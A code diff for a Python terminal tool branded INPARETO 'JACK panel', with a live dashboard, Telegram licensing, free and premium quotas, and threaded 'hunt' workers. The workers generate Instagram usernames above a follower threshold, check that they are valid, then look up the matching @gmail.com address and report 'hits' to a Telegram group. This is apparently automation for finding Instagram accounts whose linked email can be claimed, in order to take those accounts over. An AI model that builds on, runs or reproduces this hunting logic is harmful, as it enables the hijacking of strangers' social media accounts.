+            status_text = "PAUSED"
+            status_color = ANSI_YELLOW
+        else:
+            status_text = "RUNNING"
+            status_color = ANSI_GREEN
+
+    frame = [""]
+    if show_logo:
+        frame.extend(paint_logo_lines(JOINT_BADGE))
+        frame.append("")
+    else:
+        frame.append(gradient_line("  ◆ INPARETO · JACK PANEL · LIVE ◆ ", (0, 200, 255), (200, 80, 255)))
+        frame.append("")
+
+    session_rows = build_session_rows(uptime, status_text, status_color)
+    mid = (len(session_rows) + 1) // 2
+    frame.extend(_cards_side_by_side_lines(session_rows[:mid], session_rows[mid:]))
+    frame.extend(_cards_side_by_side_lines(
+        build_core_rows(generated, valid_count, hits_count, error_count, bar_w=10),
+        build_performance_rows(success_pct, hit_pct, valid_pct, bar_w=10, generated=generated),
+    ))
+
+    cycle_tag = "1×HTTP" if HUNT_USE_CYCLE else "3×HTTP"
+    profile_tag = "tx" if _IS_TERMUX else "pc"
+    config_val = (
+        f"{THREAD_COUNT}t·{profile_tag} · {cycle_tag} · {_min_followers_display()} · "
+        f"TG{'ON' if TELEGRAM_ENABLED else 'OFF'}"
+    )
+    frame.extend(_cards_side_by_side_lines(
+        [("Runtime", config_val[:19], ANSI_YELLOW)],
+        build_probe_rows(),
+    ))
+
+    if events:
+        frame.extend(_event_log_card_lines(events))
+
+    footer_fn = _paint_dashboard_footer_live if JACK_PANEL_LIVE else paint_dashboard_footer
+    frame.extend(footer_fn())
+    tick = datetime.now(timezone.utc).strftime("%H:%M:%S")
+    if JACK_PANEL_LIVE:
+        idle = max(0.0, time.monotonic() - _last_gen_at)
+        hunt_note = ""
+        if live_snap and pause_event.is_set() and _workers_started:
+            lbl = (live_snap.get("hunt_lbl") or "").strip()
+            if lbl and not lbl.startswith("active"):
+                hunt_note = f" · {lbl}"
+        elif idle > 6:
+            hunt_note = f" · gen idle {idle:.0f}s"
+        hint = f"\n  ↻ live · {tick}{hunt_note}  ·  Ctrl+C → menu · l=logout\n"
+    else:
+        hint = "\n  Snapshot — Enter for menu · l=logout · q=quit\n"
+    frame.append(apply_color(hint, ANSI_DIM))
+    return frame, show_logo
+
+
+def _snapshot_dashboard_stats():
+    """Live counters — never block panel paint on hunt worker lock."""
+    global _last_dashboard_stats
+    snap = None
+    if lock.acquire(timeout=0.08):
+        try:
+            snap = {
+                "gen": gen,
+                "valid": valid,
+                "hit": hit,
+                "errors": errors,
+                "at": time.time(),
+            }
+        finally:
+            lock.release()
+    if snap is None:
+        snap = {
+            "gen": int(_last_dashboard_stats.get("gen") or 0),
+            "valid": int(_last_dashboard_stats.get("valid") or 0),
+            "hit": int(_last_dashboard_stats.get("hit") or 0),
+            "errors": int(_last_dashboard_stats.get("errors") or 0),
+            "at": time.time(),
+        }
+    if event_log_lock.acquire(timeout=0.05):
+        try:
+            events = list(event_log)
+            snap["events"] = events
+            _last_dashboard_stats = dict(snap)
+            _last_dashboard_stats["events"] = events
+        finally:
+            event_log_lock.release()
+    else:
+        snap["events"] = list(_last_dashboard_stats.get("events") or [])
+    return snap
+
+
+def _emit_panel_text(frame_lines, *, full_clear=False):
+    """Write panel frame — live mode full-clears each tick to kill ghost lines."""
+    global _panel_live_drawn_once, _panel_last_frame_lines
+    if _panel_alt_screen:
+        sys.stdout.write("\033[2J\033[H")
+        _panel_live_drawn_once = True
+        for line in frame_lines:
+            sys.stdout.write(line)
+            sys.stdout.write("\033[K\n")
+        sys.stdout.write("\033[J")
+        _panel_last_frame_lines = len(frame_lines)
+    else:
+        clear_console()
+        sys.stdout.write("\n".join(frame_lines) + "\n")
+    sys.stdout.flush()
+
+
+def draw_dashboard(*, blocking=True, lock_timeout=1.5):
+    global DASHBOARD_SHOW_LOGO, _panel_last_draw_at
+    if blocking:
+        acquired = _panel_paint_lock.acquire(blocking=True, timeout=lock_timeout)
+    else:
+        acquired = _panel_paint_lock.acquire(blocking=False)
+    if not acquired:
+        return False
+    try:
+        _draw_dashboard_impl()
+        _panel_last_draw_at = time.time()
+        return True
+    finally:
+        _panel_paint_lock.release()
+
+
+def _draw_dashboard_impl():
+    global DASHBOARD_SHOW_LOGO
+    uptime = format_duration((datetime.now(timezone.utc) - START_TIME).total_seconds())
+    snap = _snapshot_dashboard_stats()
+    generated = int(snap.get("gen") or 0)
+    valid_count = int(snap.get("valid") or 0)
+    hits_count = int(snap.get("hit") or 0)
+    error_count = int(snap.get("errors") or 0)
+    events = snap.get("events") or []
+
+    show_logo = DASHBOARD_SHOW_LOGO
+    try:
+        frame, show_logo = _build_dashboard_frame(
+            uptime, generated, valid_count, hits_count, error_count, events,
+            show_logo=show_logo,
+        )
+    except Exception as exc:
+        frame = [
+            gradient_line("  ◆ INPARETO · JACK PANEL · LIVE ◆ ", (0, 200, 255), (200, 80, 255)),
+            "",
+            apply_color(f"  Panel build: {str(exc)[:72]}", ANSI_RED),
+            apply_color("\n  ↻ live dashboard  ·  Ctrl+C → menu · l=logout\n", ANSI_DIM),
+        ]
+
+    try:
+        text = "\n".join(frame) + "\n"
+        _emit_panel_text(frame, full_clear=show_logo and DASHBOARD_SHOW_LOGO)
+        if show_logo and DASHBOARD_SHOW_LOGO:
+            DASHBOARD_SHOW_LOGO = False
+    except Exception as exc:
+        try:
+            sys.stdout.write(
+                gradient_line("  ◆ INPARETO · JACK PANEL · LIVE ◆ ", (0, 200, 255), (200, 80, 255))
+                + "\n"
+                + apply_color(f"  Panel print: {str(exc)[:72]}", ANSI_RED)
+                + "\n"
+            )
+            sys.stdout.flush()
+        except Exception:
+            pass
+
+
+def _ensure_panel_refresh_thread():
+    """Restart background painter if it died mid-session."""
+    global _panel_refresh_thread
+    if _panel_refresh_thread is not None and _panel_refresh_thread.is_alive():
+        return
+    _panel_refresh_stop.clear()
+    _panel_refresh_thread = threading.Thread(
+        target=_panel_refresh_loop,
+        daemon=True,
+        name="panel-refresh",
+    )
+    _panel_refresh_thread.start()
+
+
+def _panel_refresh_loop():
+    """Single background painter — fixed 2s tick, always redraws."""
+    while True:
+        if _panel_refresh_stop.is_set():
+            break
+        interval = DASHBOARD_LIVE_INTERVAL if JACK_PANEL_LIVE else max(DASHBOARD_INTERVAL, 2.0)
+        t0 = time.monotonic()
+        try:
+            if JACK_PANEL_LIVE:
+                threading.Thread(
+                    target=_refresh_hunt_gateway_meta,
+                    daemon=True,
+                    name="panel-meta",
+                ).start()
+            draw_dashboard(blocking=True, lock_timeout=min(1.8, interval - 0.1))
+        except Exception as exc:
+            try:
+                log_event("PANEL", str(exc)[:80])
+            except Exception:
+                pass
+        elapsed = time.monotonic() - t0
+        wait = max(0.05, interval - elapsed)
+        if _panel_refresh_stop.wait(wait):
+            break
+
+
+_gmail_miss_logged = 0
+_ig_invalid_logged = 0
+
+
+def _log_ig_invalid_sample(username: str, data: dict) -> None:
+    """Sample why hunt_cycle returns valid=false — stops after 8 lines."""
+    global _ig_invalid_logged
+    if _ig_invalid_logged >= 8:
+        return
+    _ig_invalid_logged += 1
+    ig = str(data.get("ig_response") or data.get("error") or "unknown")[:80]
+    buf = data.get("buffer_depth", "?")
+    log_event("IG-LOOKUP", f"@{username} invalid — {ig} · buf {buf}")
+
+
+def _log_gmail_miss(username: str, response: str) -> None:
+    """Surface valid IG + gmail fail — common on Termux when token/IP breaks."""
+    global _gmail_miss_logged
+    if _gmail_miss_logged >= 5:
+        return
+    _gmail_miss_logged += 1
+    msg = (response or "unknown")[:100]
+    if "gmail_error" in msg or "parse" in msg.lower() or "token" in msg.lower():
+        log_event("GMAIL", f"@{username} valid but lookup broken — {msg}")
+    elif _gmail_miss_logged == 1:
+        log_event("GMAIL", f"@{username} valid · gmail taken ({msg})")
+
+
+def _hunt_tool_timeout():
+    """Telegram /gen and tools — match hunt read timeouts on Termux."""
+    if _IS_TERMUX:
+        return (HUNT_CONNECT_TIMEOUT, HUNT_IG_GEN_READ_TIMEOUT)
+    return (HUNT_CONNECT_TIMEOUT, API_TOOL_TIMEOUT)
+
+
+def _hunt_reserve_quota():
+    """Reserve free-tier quota before gateway work (rollback if ig_gen empty)."""
+    if not TELEGRAM_ENABLED:
+        return True
+    ok, reason, _ = plan_acquire_generation()
+    if not ok:
+        if reason == "daily_limit":
+            plan_handle_daily_limit_hit()
+            apply_worker_pause_state()
+        elif reason in ("trial_expired", "expired", "no_access"):
+            apply_worker_pause_state()
+        elif reason == "cloud_offline":
+            uid = resolve_operator_telegram_id()
+            if uid and (_dashboard_local_premium_snap(uid) or admin_is_admin(uid)):
+                log_event("PLAN", "quota cloud offline — premium hunt continues")
+                return True
+            log_event("PLAN", "quota cloud offline — retrying next cycle")
+        else:
+            log_event("PLAN", f"quota skip: {reason or 'unknown'}")
+    return ok
+
+
+def _hunt_release_quota():
+    if not TELEGRAM_ENABLED:
+        return
+    plan_release_generation()
+
+
+def _hunt_should_stop():
+    if (
+        is_locally_logged_out()
+        or _api_auto_paused
+        or _user_manual_paused
+        or not pause_event.is_set()
+    ):
+        return True
+    uid = resolve_operator_telegram_id()
+    if TELEGRAM_ENABLED and uid and operator_ban_active(uid, force=False):
+        return True
+    if (
+        TELEGRAM_ENABLED
+        and ACCESS_BLOCKED
+        and not operator_access_sticky_active()
+        and not (JACK_PANEL_LIVE and _operator_hunt_trusted())
+    ):
+        return True
+    if not _worker_api_ok():
+        if _local_gateway_mode() and pause_event.is_set():
+            return False
+        return True
+    return False
+
+
+def _run_hunt_cycle_fast(api_base):
+    """One gateway call: gen + IG + Gmail (endpoint.py hunt_cycle)."""
+    global gen, valid, hit
+    if not _hunt_reserve_quota():
+        return
+    quota_pending = True
+    url = f"{api_base}/hunt_cycle?min={MIN_FOLLOWERS}"
+    try:
+        with _hunt_gateway_sem:
+            response = _api_hunt_get_retry(
+                url,
+                timeout=_hunt_cycle_request_timeout(),
+                hold_slot=True,
+                attempts=1,
+            )
+        response.raise_for_status()
+        data = response.json()
+        _mark_api_alive_from_hunt_success()
+        if not data.get("gen_ok"):
+            _hunt_release_quota()
+            return
+        username = str(data.get("username") or "").strip()
+        if not username:
+            _hunt_release_quota()
+            return
+        quota_pending = False
+    except Exception:
+        if quota_pending:
+            _hunt_release_quota()
+        raise
+    info = data.get("info") or {}
+    is_valid = bool(data.get("valid"))
+    if "buffer_depth" in data or "ig_block_sec" in data:
+        buf_raw = data.get("buffer_depth", _hunt_gateway_meta.get("buffer"))
+        if isinstance(buf_raw, dict):
+            try:
+                buf_val = max(int(v or 0) for v in buf_raw.values())
+            except (TypeError, ValueError):
+                buf_val = _hunt_gateway_meta.get("buffer")
+        else:
+            try:
+                buf_val = int(buf_raw) if buf_raw is not None else None
+            except (TypeError, ValueError):
+                buf_val = _hunt_gateway_meta.get("buffer")
+        _hunt_gateway_meta.update({
+            "buffer": buf_val,
+            "ig_block": float(data.get("ig_block_sec") or 0.0),
+            "updated": time.time(),
+        })
+    with lock:
+        gen += 1
+        if is_valid:
+            valid += 1
+    _note_gen_success()
+    if not is_valid:
+        _log_ig_invalid_sample(username, data)
+    _note_hunt_ig_lookup_result(str(data.get("ig_response") or data.get("error") or ""))
+    if data.get("valid") and not data.get("hit"):
+        _log_gmail_miss(username, str(data.get("gmail_response") or ""))
+    if data.get("hit") and data.get("valid"):
+        submit_hit_report(username, info)
+
+
+def _run_hunt_cycle_legacy(api_base):
+    """Legacy: 3 gateway calls — semaphore per hop, quota before ig_gen."""
+    global gen, valid, hit, errors
+    if not _hunt_reserve_quota():
+        return
+    quota_pending = True
+    gen_timeout = _hunt_ig_gen_timeout()
+    lookup_timeout = _hunt_lookup_timeout()
+    try:
+        with _hunt_gateway_sem:
+            response1 = _api_hunt_get_retry(
+                f"{api_base}/ig_gen?min={MIN_FOLLOWERS}",
+                timeout=gen_timeout,
+                hold_slot=True,
+            )
+            response1.raise_for_status()
+            data = response1.json()
+            username = str(data.get("username") or "").strip()
+            if not username:
+                _hunt_release_quota()
+                return
+            quota_pending = False
+    except Exception:
+        if quota_pending:
+            _hunt_release_quota()
+        raise
+    info = data.get("info", {})
+    with lock:
+        gen += 1
+    _note_gen_success()
+    if len(username) < 6:
+        return
+    if _hunt_should_stop():
+        return
+    email = username + "@gmail.com"
+    try:
+        with _hunt_gateway_sem:
+            response2 = _api_hunt_get_retry(
+                f"{api_base}{HUNT_IG_LOOKUP_ROUTE}?email={quote(email)}",
+                timeout=lookup_timeout,
+                hold_slot=True,
+            )
+            response2.raise_for_status()
+            ig_body = response2.json()
+            if ig_body.get("status") is not True:
+                _note_hunt_ig_lookup_result(str(ig_body.get("response") or ""))
+                return
+            _note_hunt_ig_lookup_result(str(ig_body.get("response") or "ok"))
+            if _hunt_should_stop():
+                return
+            response3 = _api_hunt_get(
+                f"{api_base}/gmail_lookup?email={quote(email)}",
+                timeout=lookup_timeout,
+                hold_slot=True,
+            )
+            if response3.status_code >= 500:
+                with lock:
+                    errors += 1
+                log_event("GMAIL", f"lookup HTTP {response3.status_code} — restart endpoint.py")
+                return
+            response3.raise_for_status()
+            gmail_body = response3.json()
+    except (requests.RequestException, ValueError) as exc:
+        with lock:
+            errors += 1
+        log_event("GMAIL", f"@{username} lookup failed — {str(exc)[:80]}")
+        return
+    with lock:
+        valid += 1
+    if gmail_body.get("status") is True:
+        submit_hit_report(username, info)
+    else:
+        _log_gmail_miss(username, str(gmail_body.get("response") or ""))
+
+
+def run():
+    global gen, valid, hit, errors, _hunt_inflight
+
+    if (
+        TELEGRAM_ENABLED
+        and ACCESS_BLOCKED
+        and not operator_access_sticky_active()
+        and not (JACK_PANEL_LIVE and _operator_hunt_trusted())
+    ):
+        return
+
+    if not _worker_api_ok():
+        return
+
+    api_base = get_api_base_url()
+
+    with _hunt_inflight_lock:
+        _hunt_inflight += 1
+    try:
+        if HUNT_USE_CYCLE:
+            _run_hunt_cycle_fast(api_base)
+        else:
+            _run_hunt_cycle_legacy(api_base)
+
+    except requests.exceptions.RequestException as e:
+        _mark_api_dead_from_hunt(e)
+        if _hunt_transient_error(e):
+            _hunt_register_transient_fail()
+            return
+        with lock:
+            errors += 1
+        if not _api_auto_paused:
+            tag = "TIMEOUT" if isinstance(e, requests.exceptions.Timeout) else "ERROR"
+            log_event(tag, str(e)[:80])
+    except Exception as e:
+        if _hunt_transient_error(e):
+            _hunt_register_transient_fail()
+            return
+        with lock:
+            errors += 1
+        log_event("ERROR", str(e)[:100])
+    finally:
+        with _hunt_inflight_lock:
+            _hunt_inflight = max(0, _hunt_inflight - 1)
+
+
+def worker(worker_id=0):
+    """Each thread runs one hunt cycle (prefer single /hunt_cycle HTTP hop)."""
+    while True:
+        if is_locally_logged_out():
+            pause_event.clear()
+            pause_event.wait(timeout=API_WORKER_IDLE_SEC)
+            continue
+        if _api_auto_paused or _user_manual_paused:
+            if _user_manual_paused and not _api_auto_paused and _worker_api_ok():
+                idle = API_WORKER_IDLE_SEC
+            else:
+                idle = API_WORKER_RECOVERY_IDLE
+            pause_event.wait(timeout=idle)
+            continue
+        if not _worker_api_ok() and not _local_gateway_mode():
+            pause_event.wait(timeout=API_WORKER_RECOVERY_IDLE)
+            continue
+        if not pause_event.is_set():
+            pause_event.wait(timeout=0.5)
+            continue
+        uid = resolve_operator_telegram_id()
+        if TELEGRAM_ENABLED and uid and operator_ban_active(uid, force=False):
+            pause_event.clear()
+            pause_event.wait(timeout=ACCESS_SYNC_INTERVAL_SEC)
+            continue
+        if TELEGRAM_ENABLED and ACCESS_BLOCKED and not _operator_hunt_trusted():
+            global _worker_last_access_sync
+            now_sync = time.time()
+            if now_sync - _worker_last_access_sync >= ACCESS_SYNC_INTERVAL_SEC:
+                _worker_last_access_sync = now_sync
+                sync_operator_access()
+            if ACCESS_BLOCKED and not _operator_hunt_trusted():
+                pause_event.wait(timeout=0.15)
+            continue
+        if worker_id >= THREAD_COUNT:
+            pause_event.wait(timeout=API_WORKER_IDLE_SEC)
+            continue
+        if not _worker_api_ok():
+            pause_event.wait(timeout=API_WORKER_RECOVERY_IDLE)
+            continue
+        if _hunt_in_network_blip():
+            pause_event.wait(timeout=0.15)
+            continue
+        if _hunt_in_ip_change_pause():
+            pause_event.wait(timeout=0.5)
+            continue
+        _hunt_worker_backoff_before_cycle()
+        run()
+
+
+def operator_session_ready(*, refresh=False):
+    """Fully verified for hunting + terminal control panel (Telegram id based)."""
+    if is_locally_logged_out():
+        return False
+    if not TELEGRAM_ENABLED:
+        return True
+    if refresh:
+        reconcile_operator_hit_group()
+        sync_operator_access()
+    return operator_access_ok(force=refresh)
+
+
+def operator_session_ready_bounded(*, refresh=False, timeout=VERIFY_UI_TIMEOUT):
+    if not refresh:
+        if operator_session_ready(refresh=False):
+            return True
+        return operator_terminal_ready_local()
+    reconcile_operator_hit_group()
+    try:
+        with ThreadPoolExecutor(max_workers=1) as pool:
+            if pool.submit(operator_session_ready, refresh=True).result(timeout=timeout):
+                return True
+    except FuturesTimeoutError:
+        log_event("ACCESS", "verification refresh timed out")
+    return operator_terminal_ready_local()
+
+
+def operator_terminal_ready_local(*, fast=False):
+    """Terminal menu — plan + hit group. fast=True: skip slow cloud round-trips."""
+    if is_locally_logged_out():
+        return False
+    if not TELEGRAM_ENABLED:
+        return True
+    user_id = resolve_operator_telegram_id()
+    if not user_id:
+        return False
+    admin_load_settings(force=False)
+    if admin_is_admin(user_id):
+        return bool(read_local_hit_group_id() or get_operator_hit_group_id())
+    if fast:
+        entitled, _, info = operator_plan_entitled(user_id)
+        if not entitled:
+            return False
+        if isinstance(info, dict) and info.get("plan") == PLAN_FREE:
+            used = int(info.get("day_count") or 0)
+            limit = int(info.get("limit") or FREE_DAILY_GEN_LIMIT)
+            if used >= limit:
+                return False
+        return bool(read_local_hit_group_id() or get_operator_hit_group_id())
+    refresh_terminal_license_from_cloud()
+    entitled, _, info = operator_plan_entitled(user_id)
+    if not entitled:
+        return False
+    if isinstance(info, dict) and info.get("plan") == PLAN_FREE:
+        ok, reason, _ = plan_can_hunt(user_id)
+        if not ok and reason == "daily_limit":
+            return False
+    sync_local_hit_group_from_cloud()
+    return bool(read_local_hit_group_id() or get_operator_hit_group_id())
+
+
+def terminal_verification_complete(*, refresh=False):
+    """True when setup is complete. refresh=True pulls cloud state first."""
+    if not TELEGRAM_ENABLED:
+        return True
+    user_id = resolve_operator_telegram_id()
+    if refresh:
+        ensure_boot_access_context()
+    else:
+        admin_load_settings(force=False)
+    if operator_terminal_ready_local(fast=True):
+        mark_operator_access_verified()
+        if refresh:
+            _spawn_access_cache_refresh()
+        return True
+    if refresh:
+        reconcile_operator_hit_group()
+        sync_local_hit_group_from_cloud()
+        if operator_terminal_ready_local(fast=True):
+            mark_operator_access_verified()
+            _spawn_access_cache_refresh()
+            return True
+    admin_load_settings(force=False)
+    if admin_is_admin(user_id):
+        if operator_terminal_ready_local(fast=True):
+            mark_operator_access_verified()
+            return True
+        return False
+    if not operator_terminal_ready_local(fast=True):
+        return False
+    return operator_session_ready_bounded(refresh=True)
+
+
+def _spawn_access_cache_refresh():
+    def _run():
+        try:
+            reconcile_operator_hit_group()
+            sync_operator_access()
+            operator_access_ok(force=True)
+        except Exception as exc:
+            log_event("ACCESS REFRESH", str(exc)[:80])
+
+    threading.Thread(target=_run, daemon=True, name="access-refresh").start()
+
+
+def _spawn_hit_group_warmup():
+    def _run():
+        try:
+            reconcile_operator_hit_group()
+            sync_local_hit_group_from_cloud()
+        except Exception as exc:
+            log_event("HG WARM", str(exc)[:80])
+
+    threading.Thread(target=_run, daemon=True, name="hg-warm").start()
+
+
+def build_terminal_verification_rows():
+    """Status checklist while waiting for full access."""
+    user_id = resolve_operator_telegram_id()
+    if not user_id:
+        return [_terminal_verify_line("Telegram", "Link your bot first (restart joint.py)", ANSI_YELLOW)]
+    rows = []
+    entitled, plan_reason, info = operator_plan_entitled(user_id)
+    if not entitled:
+        if plan_reason == "trial_expired":
+            rows.append(_terminal_verify_line(
+                "Plan", f"Free trial ended ({FREE_TRIAL_DAYS} days)", ANSI_RED,
+            ))
+        elif plan_reason == "expired":
+            exp = info.get("expires_at") if isinstance(info, dict) else None
+            rows.append(_terminal_verify_line(
+                "Premium", f"Expired · {license_format_expiry(exp)}", ANSI_RED,
+            ))
+        else:
+            rows.append(_terminal_verify_line("Plan", "Inactive — /plan or /redeem in bot", ANSI_RED))
+        rows.append(_terminal_verify_line("Tip", "Admin: /grant YOUR_ID 30", ANSI_DIM))
+        return rows
+    if isinstance(info, dict) and info.get("plan") == PLAN_FREE:
+        used = int(info.get("day_count") or 0)
+        limit = int(info.get("limit") or FREE_DAILY_GEN_LIMIT)
+        days_left = int(info.get("days_left") or 0)
+        if used >= limit:
+            rows.append(_terminal_verify_line(
+                "Plan", f"Free limit {used:,}/{limit:,} today", ANSI_RED,
+            ))
+            rows.append(_terminal_verify_line("Fix", "Switch to Premium — /redeem", ANSI_DIM))
+            return rows
+        rows.append(_terminal_verify_line(
+            "Plan", f"Free · {days_left}d left · {used:,}/{limit:,} today", ANSI_YELLOW,
+        ))
+    else:
+        exp = info.get("expires_at") if isinstance(info, dict) else None
+        rows.append(_terminal_verify_line(
+            "Plan", f"Premium · until {license_format_expiry(exp)}", ANSI_GREEN,
+        ))
+    granted, state = admin_user_access_granted(user_id)
+    if not granted:
+        if state == "banned":
+            return rows + [_terminal_verify_line("Access", "Suspended", ANSI_RED)]
+        rows.append(_terminal_verify_line("Channels", "Join required — /verify in bot", ANSI_YELLOW))
+        return rows
+    rows.append(_terminal_verify_line("Channels", "OK", ANSI_GREEN))
+    hg_ok, hg_reason = operator_hit_group_access_state(force=True)
+    gid = get_operator_hit_group_id()
+    if hg_ok:
+        rows.append(_terminal_verify_line("Hit group", f"OK · {gid or 'linked'}", ANSI_GREEN))
+    elif hg_reason == "not_admin":
+        rows.append(_terminal_verify_line("Hit group", "Promote bot to admin", ANSI_YELLOW))
+    else:
+        rows.append(_terminal_verify_line("Hit group", "Link group — /verifyhitgroup", ANSI_YELLOW))
+    return rows
+
+
+def build_terminal_access_notice_rows_local():
+    """Terminal checklist — local .inpareto_* + cloud license (Telegram id only)."""
+    user_id = resolve_operator_telegram_id()
+    if not user_id:
+        return [_terminal_verify_line("Telegram", "Link bot first (restart joint.py)", ANSI_YELLOW)]
+
+    admin_load_settings(force=False)
+
+    if admin_is_admin(user_id):
+        gid = read_local_hit_group_id() or get_operator_hit_group_id()
+        if gid:
+            return [_terminal_verify_line("Access", "Admin — press Enter to open menu", ANSI_GREEN)]
+        return [
+            _terminal_verify_line("Hit group", "Not linked — /verifyhitgroup in GROUP", ANSI_YELLOW),
+            _terminal_verify_line(
+                "Fix", "Add bot to group → promote admin → /verifyhitgroup", ANSI_DIM,
+            ),
+        ]
+
+    entitled, plan_reason, info = operator_plan_entitled(user_id)
+    if entitled:
+        rows = []
+        if isinstance(info, dict) and info.get("plan") == PLAN_FREE:
+            used = int(info.get("day_count") or 0)
+            limit = int(info.get("limit") or FREE_DAILY_GEN_LIMIT)
+            days_left = int(info.get("days_left") or 0)
+            if used >= limit:
+                return [
+                    _terminal_verify_line(
+                        "Plan", f"Free daily limit {used:,}/{limit:,}", ANSI_RED,
+                    ),
+                    _terminal_verify_line("Fix", "Switch to INPARETO Premium — /redeem", ANSI_DIM),
+                ]
+            rows.append(_terminal_verify_line(
+                "Plan",
+                f"Free · {days_left}d trial · {used:,}/{limit:,} today",
+                ANSI_YELLOW,
+            ))
+        elif isinstance(info, dict) and info.get("plan") == PLAN_PREMIUM:
+            rows = [
+                _terminal_verify_line(
+                    "Plan",
+                    f"Premium · until {license_format_expiry(info.get('expires_at'))}",
+                    ANSI_GREEN,
+                ),
+            ]
+        gid = read_local_hit_group_id() or get_operator_hit_group_id()
+        if gid:
+            rows.append(_terminal_verify_line("Hit group", f"Linked · {gid}", ANSI_GREEN))
+            rows.append(_terminal_verify_line("Menu", "Press Enter to open control panel", ANSI_GREEN))
+        else:
+            rows.append(_terminal_verify_line("Hit group", "Required — /verifyhitgroup in GROUP", ANSI_YELLOW))
+        return rows
+
+    if plan_reason == "expired":
+        exp = info.get("expires_at") if isinstance(info, dict) else None
+        return [
+            _terminal_verify_line(
+                "Plan", f"Premium expired · {license_format_expiry(exp)}", ANSI_RED,
+            ),
+            _terminal_verify_line("Fix", "/redeem NEW-KEY in bot", ANSI_DIM),
+        ]
+    if plan_reason == "trial_expired":
+        return [
+            _terminal_verify_line("Plan", f"Free trial ended ({FREE_TRIAL_DAYS} days)", ANSI_RED),
+            _terminal_verify_line("Fix", "/redeem INPA-… for Premium", ANSI_DIM),
+        ]
+    if plan_reason == "cloud_offline":
+        return [
+            _terminal_verify_line("Plan", "Cloud offline — retry Enter in a moment", ANSI_RED),
+            _terminal_verify_line("Fix", "Check internet · /plan in bot", ANSI_DIM),
+        ]
+    return [
+        _terminal_verify_line("Plan", "No active trial or Premium license", ANSI_RED),
+        _terminal_verify_line("Fix", "/plan in bot · /redeem for Premium", ANSI_DIM),
+    ]
+
+
+def _fetch_terminal_verification_ui():
+    pending = build_terminal_access_notice_rows()
+    if pending:
+        return _terminal_notice_title(pending), pending
+    return "VERIFICATION REQUIRED", build_terminal_verification_rows()
+
+
+def render_terminal_verification_screen(*, clear=False, refresh=False):
+    if refresh:
+        refresh_terminal_license_from_cloud()
+        reconcile_operator_hit_group()
+        sync_local_hit_group_from_cloud()
+    if clear:
+        clear_console()
+    print()
+    for line in paint_logo_lines(JOINT_BADGE):
+        print(line)
+    print()
+    sys.stdout.flush()
+    title = "VERIFICATION REQUIRED"
+    body = build_terminal_access_notice_rows_local()
+    if body and body[0][1] and "ready after Enter" in str(body[0][1]).lower():
+        title = "VERIFICATION"
+    for line in paint_action_box(title, body, ANSI_YELLOW):
+        print(line)
+    if TELEGRAM_ENABLED or has_local_operator_session() or _read_stored_chat_id():
+        print(
+            apply_color(
+                "  Tip: l = log out this device from the prompt below.\n",
+                ANSI_DIM,
+            )
+        )
+    print()
+    sys.stdout.flush()
+
+
+def render_session_ready_menu():
+    print()
+    for line in paint_logo_lines(JOINT_BADGE):
+        print(line)
+    print()
+    tg_line = "ON · remote bot active" if TELEGRAM_ENABLED else "OFF"
+    with _health_lock:
+        api_ok = bool(_health_cache.get("api"))
+    rows = [
+        ("Session", "background workers ON", ANSI_GREEN),
+        ("Telegram", tg_line, ANSI_GREEN if TELEGRAM_ENABLED else ANSI_DIM),
+        ("API", "ON" if api_ok else "OFF · run endpoint.py", ANSI_GREEN if api_ok else ANSI_RED),
+        ("JACK panel", "use menu to start", ANSI_YELLOW),
+    ]
+    print_cards([rows])
+    for line in paint_action_box(
+        "READY",
+        [
+            ("Session has been started. Hunt runs in background.", ANSI_GREEN),
+            ("Control the session using Remote Bot anytime from Telegram.", ANSI_CYAN),
+        ],
+        ANSI_CYAN,
+    ):
+        print(line)
+    print()
+    for line in paint_action_box(
+        "MENU",
+        [
+            ("1  Open Live JACK panel (hunt runs in background)", ANSI_GREEN),
+            ("2  View Session Status snapshot", ANSI_CYAN),
+            ("l  Log out (clears this device)", ANSI_YELLOW),
+            ("q  Leave menu (hunt keeps running)", ANSI_DIM),
+        ],
+        ANSI_MAGENTA,
+    ):
+        print(line)
+    print()
+
+
+def run_live_jack_panel():
+    global DASHBOARD_SHOW_LOGO, JACK_PANEL_LIVE, _panel_refresh_thread, _panel_live_drawn_once
+    DASHBOARD_SHOW_LOGO = True
+    _panel_live_drawn_once = False
+    JACK_PANEL_LIVE = True
+    _panel_refresh_stop.clear()
+    _panel_enter_alt_screen()
+    apply_worker_pause_state()
+    _ensure_panel_refresh_thread()
+    try:
+        draw_dashboard(blocking=True, lock_timeout=3.0)
+    except Exception:
+        pass
+    try:
+        while True:
+            time.sleep(1.0)
+            _ensure_panel_refresh_thread()
+    except KeyboardInterrupt:
+        JACK_PANEL_LIVE = False
+        _panel_refresh_stop.set()
+        _panel_leave_alt_screen()
+        print(apply_color("\n  ▸ Panel stopped — workers + Telegram still running\n", ANSI_YELLOW))
+
+
+def _headless_vps_mode():
+    v = os.environ.get("INPARETO_HEADLESS", "").strip().lower()
+    return v in ("1", "true", "yes", "vps")
+
+
+def run_session_menu_loop():
+    global _session_awaiting_verification
+    _session_awaiting_verification = True
+    _spawn_boot_access_refresh()
+    _spawn_hit_group_warmup()
+    first_pass = True
+    need_refresh = False
+    while True:
+        render_terminal_verification_screen(clear=not first_pass, refresh=need_refresh)
+        first_pass = False
+        sys.stdout.flush()
+        if terminal_verification_complete(refresh=need_refresh):
+            break
+        need_refresh = False
+        print(
+            apply_color(
+                "\n  Finish setup in Telegram, then press Enter to refresh.\n"
+                "  License: /redeem KEY  ·  Hit group: /verifyhitgroup in GROUP\n"
+                "  Channels: /verify in bot DM if shown.\n"
+                f"  {TERMINAL_WAIT_HINT}\n",
+                ANSI_DIM,
+            )
+        )
+        choice = premium_input("Waiting", TERMINAL_WAIT_HINT).lower()
+        if choice in ("l", "logout", "out", "log out"):
+            if terminal_execute_logout():
+                _session_awaiting_verification = False
+                return "logged_out"
+            need_refresh = True
+            continue
+        if choice in ("q", "quit", "exit"):
+            _session_awaiting_verification = False
+            shutdown_joint_session(via_menu=True)
+        invalidate_operator_gate_cache()
+        need_refresh = True
+    _session_awaiting_verification = False
+    _terminal_notice_signature = ""
+    mark_operator_access_verified()
+    start_hunt_workers()
+    if _headless_vps_mode():
+        print(
+            apply_color(
+                "\n  ▸ Headless VPS — hunt workers running (INPARETO_HEADLESS=1)\n"
+                "  ▸ Logs: pm2 logs inpareto-joint · Telegram: /stats /pause /resume\n",
+                ANSI_GREEN,
+            )
+        )
+        try:
+            while True:
+                time.sleep(3600)
+        except KeyboardInterrupt:
+            shutdown_joint_session()
+        return
+    render_session_ready_menu()
+    while True:
+        choice = premium_input("Menu", TERMINAL_MENU_HINT).lower()
+        if choice in ("1", "panel", "jack", "start", "live"):
